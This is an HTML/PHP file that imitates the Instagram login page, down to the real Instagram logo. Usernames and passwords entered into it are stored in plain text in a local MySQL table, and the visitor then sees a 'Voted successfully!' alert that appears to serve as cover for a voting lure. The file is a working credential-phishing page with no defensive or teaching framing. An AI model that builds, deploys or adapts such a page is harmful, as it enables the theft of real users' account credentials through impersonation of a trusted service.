<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
            background-color: #fafafa;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            max-width: 350px;
            width: 90%;
            text-align: center;
        }

        .logo {
            margin-bottom: 20px;
            width: 175px;
            height: auto;
        }

        .login-box {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            padding: 20px;
            border-radius: 3px;
            box-shadow: 0 1px 0 rgba(0,0,0,0.05);
        }

        .login-box input[type="text"],
        .login-box input[type="password"] {
            width: 100%;
            margin-bottom: 10px;
            padding: 9px 12px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background-color: #fafafa;
            box-sizing: border-box;
        }

        .login-box button {
            background-color: #3897f0;
            border: none;
            color: #fff;
            border-radius: 20px;
            padding: 10px;
            width: 100%;
            cursor: pointer;
            font-size: 14px;
            transition: background-color 0.3s;
        }

        .login-box button:hover {
            background-color: #3578e5;
        }

        .signup-link {
            margin-top: 20px;
            font-size: 14px;
            color: #003569;
        }
    </style>
</head>
<body>
    <div class="container">
        <img class="logo" src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram Logo">
        <div class="login-box">
            <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="POST">
                <input type="text" name="username" placeholder="Username" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Log In</button>
            </form>
        </div>
        <p class="signup-link">Don't have an account? <a href="#">Sign up</a></p>
    </div>

    <?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        // Database connection parameters
        $servername = "localhost";
        $username = "root";
        $password = "";
        $dbname = "instagram_db";

        // Create connection
        $conn = new mysqli($servername, $username, $password, $dbname);

        // Check connection
        if ($conn->connect_error) {
            die("Connection failed: " . $conn->connect_error);
        }

        // Escape user inputs for security
        $username = $conn->real_escape_string($_POST['username']);
        $password = $conn->real_escape_string($_POST['password']);

        // SQL query to insert data into the database
        $sql = "INSERT INTO users (username, password) VALUES ('$username', '$password')";

        if ($conn->query($sql) === TRUE) {
            echo "<script>alert('Voted successfully!');</script>";
        } else {
            echo "Error: " . $sql . "<br>" . $conn->error;
        }

        // Close connection
        $conn->close();
    }
    ?>
</body>
</html>
